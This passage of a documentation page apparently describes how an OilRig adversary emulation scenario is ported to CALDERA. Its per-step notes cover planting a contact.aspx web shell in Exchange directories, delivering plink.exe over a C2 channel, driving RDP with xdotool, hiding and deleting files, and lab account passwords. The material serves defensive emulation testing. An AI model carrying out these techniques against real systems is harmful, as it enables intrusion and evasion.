+<li><code v-pre>Contact.aspx</code> will be uploaded as a payload to the CALDERA server. It will be downloaded to THEBLOCK through the C2 channel, and will then be copied to the WATERFALLS Exchange Web Services directory. In the original scenario, <code v-pre>contact.aspx</code> is downloaded directly to the <code v-pre>C:\Users\Public\</code> directory on THEBLOCK. However, in the port, CALDERA will download <code v-pre>contact.aspx</code> to the agent&#x27;s current directory, which will be <code v-pre>C:\Users\gosta\AppData\Local\SystemFailureReporter\</code>. Then, Step 4.A.1 will copy the file from <code v-pre>C:\Users\gosta\AppData\Local\SystemFailureReporter\</code> to <code v-pre>C:\Users\Public\</code>.</li>
+<li>The ability labeled as Step 4.A.2 &quot;Server Software Component: Web Shell&quot; (T1505.003) includes Step 4.A.3, &quot;Hide Artifacts: Hidden Files &amp; Directories&quot; (T1564.001).</li>
+<li>Step 4.A.5, &quot;Indicator Removal on Host: File Deletion&quot; (T1070.004) will be included in the cleanup command for Step 4.A.1.</li>
+</ul>
+<doc-anchor-target id="step-5">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-5">#</doc-anchor-trigger>
+        <span>Step 5</span>
+    </h2>
+</doc-anchor-target>
+<ul>
+<li>This step will be performed by the agent that was manually launched on the &quot;attacker&quot; system.</li>
+<li>The <code v-pre>-s</code> flag was added to the curl commands to activate &quot;silent&quot; mode. This restricts the progress meter from displaying in order to allow CALDERA GUI to properly capture terminal output. The <code v-pre>-s</code> flag will also restrict error messages from appearing.</li>
+<li>In this step and in all following steps, the password for <code v-pre>gosta</code> has been changed from <code v-pre>d0ntGoCH4$ingW8trfalls</code> to <code v-pre>d0ntGoCH4ingW8trfalls</code>.</li>
+</ul>
+<doc-anchor-target id="step-6">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-6">#</doc-anchor-trigger>
+        <span>Step 6</span>
+    </h2>
+</doc-anchor-target>
+<ul>
+<li>The <code v-pre>-s</code> flag was added to the curl commands to activate &quot;silent&quot; mode. This restricts the progress meter from displaying in order to allow CALDERA GUI to properly capture terminal output. The <code v-pre>-s</code> flag will also restrict error messages from appearing.</li>
+</ul>
+<doc-anchor-target id="step-7">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-7">#</doc-anchor-trigger>
+        <span>Step 7</span>
+    </h2>
+</doc-anchor-target>
+<ul>
+<li><code v-pre>plink.exe</code> will be downloaded to the workstation as a payload from the CALDERA server. In the original scenario, <code v-pre>plink.exe</code> is initially downloaded to <code v-pre>C:\Users\Public\Downloads\plink.exe</code>. In the port, it will be downloaded through the C2 channel to the same folder as the agent on the <code v-pre>THEBLOCK</code>. Then, it will be copied to the <code v-pre>Downloads</code> folder.</li>
+<li>The additional <code v-pre>-no-antispoof</code> flag was added to avoid the required interaction step.</li>
+<li>Step 7.A.3, &quot;Valid Accounts: Domain Accounts&quot; (T1078.002) is included in Step 7.A.4.</li>
+<li>Steps 7.A.2 and 7.A.4 are run using <code v-pre>exec-background</code> which runs a command as a background process. The <code v-pre>/cert-ignore</code> parameter is also added to Step 7.A.4.</li>
+<li>The password for <code v-pre>saka</code> has been changed from <code v-pre>$ceKa#zU$Uc4^9yZ</code> to <code v-pre>ceKa#zUUc4^9yZ</code>.</li>
+</ul>
+<doc-anchor-target id="step-8">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-8">#</doc-anchor-trigger>
+        <span>Step 8</span>
+    </h2>
+</doc-anchor-target>
+<ul>
+<li><code v-pre>xdotool</code> is used to control the RDP session to <code v-pre>10.1.0.6</code>. Because <code v-pre>xdotool</code> controls a remote system using pre-determined key presses, the sequence of key presses in Step 8 may need to be modified depending on your environment.</li>
+<li>Step 8.A.9 includes Steps 8.A.5 through 8.A.8.</li>
+</ul>
+<doc-anchor-target id="step-9">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-9">#</doc-anchor-trigger>
+        <span>Step 9</span>
+    </h2>
+</doc-anchor-target>
+<ul>
+<li>In continuation from Step 8, <code v-pre>xdotool</code> is used to control the RDP session.</li>
+</ul>
+<doc-anchor-target id="step-10">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-10">#</doc-anchor-trigger>
+        <span>Step 10</span>
+    </h2>
+</doc-anchor-target>
+<ul>
+<li>In continuation from Step 8, <code v-pre>xdotool</code> is used to control the RDP session.</li>
+<li>Step 10.A.6 includes Steps 10.A.1-10.A.6</li>
+</ul>
+<doc-anchor-target id="step-11">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-11">#</doc-anchor-trigger>
+        <span>Step 11</span>
+    </h2>
+</doc-anchor-target>
+<ul>
+<li>Because the <code v-pre>gosta</code> agent replaces SideTwist, the <code v-pre>gosta</code> agent will be killed instead of killing SideTwist. Additionally, <code v-pre>update.xml</code> was not used in the port so it does not need to be deleted in the cleanup stage.</li>
+<li>The API key fact value may need to be updated to your server&#x27;s API key in order to modify the <code v-pre>gosta</code> agent&#x27;s watchdog value, which then kills the agent.</li>
+<li><code v-pre>b.exe</code> was saved to agent&#x27;s location as a payload, was run from that location, and was automatically deleted when the command finished. Therefore, it will not be deleted in this step.</li>
+</ul>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../managedservices/oilrig/emulation_plan/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">Scenario Overview</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../managedservices/oilrig/emulation_plan/infrastructure/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">Scenario Infrastructure</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "DEPENDENCIES", level: 4, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
